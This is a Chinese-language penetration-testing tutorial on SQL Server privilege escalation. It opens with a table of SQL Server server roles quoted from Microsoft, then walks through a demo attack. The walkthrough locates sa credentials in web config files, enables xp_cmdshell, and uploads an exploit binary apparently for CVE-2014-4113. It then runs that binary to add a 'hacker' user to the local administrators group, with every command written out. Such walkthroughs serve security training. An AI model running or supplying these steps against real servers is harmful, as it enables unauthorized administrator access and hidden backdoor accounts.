# SQL Server简介

SQL Server默认登录名是sa（System Administrator，表示系统管理员），对应数据库用户是dbo。

| 服务器级的固定角色 | 说明                                                         |
| :----------------- | :----------------------------------------------------------- |
| **sysadmin**       | sysadmin 固定服务器角色的成员可以在服务器上执行任何活动。    |
| **serveradmin**    | **serveradmin** 固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。 |
| **securityadmin**  | **securityadmin** 固定服务器角色的成员可以管理登录名及其属性。 他们可以 `GRANT`、`DENY` 和 `REVOKE` 服务器级权限。 他们还可以 `GRANT`、`DENY` 和 `REVOKE` 数据库级权限（如果他们具有数据库的访问权限）。 此外，他们还可以重置 SQL Server 登录名的密码。  **重要提示：** 如果能够授予对 数据库引擎 的访问权限和配置用户权限，安全管理员可以分配大多数服务器权限。 **securityadmin** 角色应视为与 **sysadmin** 角色等效。 |
| **processadmin**   | processadmin 固定服务器角色的成员可以终止在 SQL Server 实例中运行的进程。 |
| **setupadmin**     | setupadmin 固定服务器角色的成员可以使用 Transact-SQL 语句添加和删除链接服务器。 （使用 Management Studio 时需要 sysadmin 成员资格。） |
| **bulkadmin**      | bulkadmin 固定服务器角色的成员可以运行 `BULK INSERT` 语句。  |
| **diskadmin**      | diskadmin 固定服务器角色用于管理磁盘文件。                   |
| **dbcreator**      | **dbcreator** 固定服务器角色的成员可以创建、更改、删除和还原任何数据库。 |
| **public**         | 每个SQL Server登录名都属于public服务器角色。 如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限，该用户将继承授予该对象的public角色的权限。 只有在希望所有用户都能使用对象时，才在对象上分配Public权限。 你无法更改具有Public角色的成员身份。  注意：public 与其他角色的实现方式不同，可通过public固定服务器角色授予、拒绝或撤销权限 。 |

> 来源于[微软官网](https://docs.microsoft.com/zh-cn/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver15)



# 提权方式

## 溢出提权

漏洞编号：**CVE-2014-4113-Exploit**

### 查找账号和密码

在渗透测试过程中，我们进入到某服务器后台，通过查看后台进程查看到有SQL Server在运行，那么可以通过查找SA的密码，执行命令，但是如果不是系统权限，还要看管理员安装SQL Server时的（对SA账号权）限设置，那么就需要利用相关漏洞或脚本来提权。

**账号密码查找路径**

```
* web.config
* config.asp
* conn.aspx
* database.aspx
```

### 开启xp_cmdshell

**这里是利用了脚本来实现了可视化页面的一些操作，方便我们进行测试。**

```
Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829111438.png)

**查看当前用户**

可以看到当前用户是一个普通用户权限，可以执行一些基础命令，接下来可以利用相关工具来提高当前用户的权限。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829111846.png)

### 漏洞利用程序上传

上传自定义的Win64.exe程序

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829115519.png)

如果该目录没有权限上传文件，可以将程序上传到其他目录，可以利用脚本来进行扫描，保存到相关目录然后再指定路径来调用即可。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829120127.png)

**使用自定义的程序执行命令**

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829114947.png)

### 开始提权

**添加用户**

```
/c C:\inetpub\wwwroot\www.demo1.com\Win64.exe "net user hacker hacker /add"
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829121111.png)

**添加到管理员组**

```
/c C:\inetpub\wwwroot\www.demo1.com\Win64.exe "net localgroup administrators hacker /add"
```

**查看用户权限**

可以看到hacker用户已经成功添加到Administrator用户组。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210829121617.png)

